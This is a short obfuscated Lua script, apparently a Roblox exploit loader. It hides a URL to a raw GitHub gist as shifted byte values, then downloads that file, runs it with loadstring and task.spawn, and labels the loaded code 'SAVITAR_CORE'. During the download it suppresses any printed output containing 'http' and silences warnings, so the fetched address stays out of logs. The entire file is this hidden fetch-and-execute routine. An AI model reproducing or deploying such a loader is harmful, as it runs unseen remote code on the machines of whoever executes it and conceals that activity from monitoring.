local _0x1 = string; local _0x2 = table; local _0x3 = game;
local _0x4 = {116,128,128,124,127,70,59,59,115,117,127,128,58,115,117,128,116,129,110,129,127,113,126,111,123,122,128,113,122,128,58,111,123,121,59,67,95,109,130,117,128,109,126,59,63,65,109,66,113,112,109,113,114,68,114,62,114,66,69,67,62,114,62,114,62,63,68,68,65,111,110,111,63,61,62,113,59,126,109,131,59,110,61,69,110,109,110,112,113,60,60,109,69,63,60,62,63,64,112,65,61,112,111,111,62,113,114,112,111,63,62,61,114,67,113,112,112,113,61,69,65,59,82,96,77,92,57,95,77,98,85,96,77,94,57,84,97,78,57,78,81,96,77}
local _0x5 = {83,65,86,73,84,65,82}

local function _0x6()
    local _0x7 = print; local _0x8 = warn;
    print = function(...) if not tostring(...):find("http") then _0x7(...) end end;
    warn = function() end;
    local _0x9 = {}
    for i=1, #_0x4 do
        _0x9[i] = _0x1.char(_0x4[i] - 12)
    end
    local _0xA = _0x2.concat(_0x9)
    local _0xB, _0xC = pcall(function()
        return _0x3:HttpGet(_0xA .. "?v=" .. _0x1.sub(tostring(math.random()), 3, 10), true)
    end)
    print = _0x7; warn = _0x8;
    if _0xB and _0xC then
        local _0xD = loadstring(_0xC, _0x1.reverse("EROC_RATIVAS"))
        if _0xD then
            task.spawn(_0xD)
        end
    end
end
_0x6()
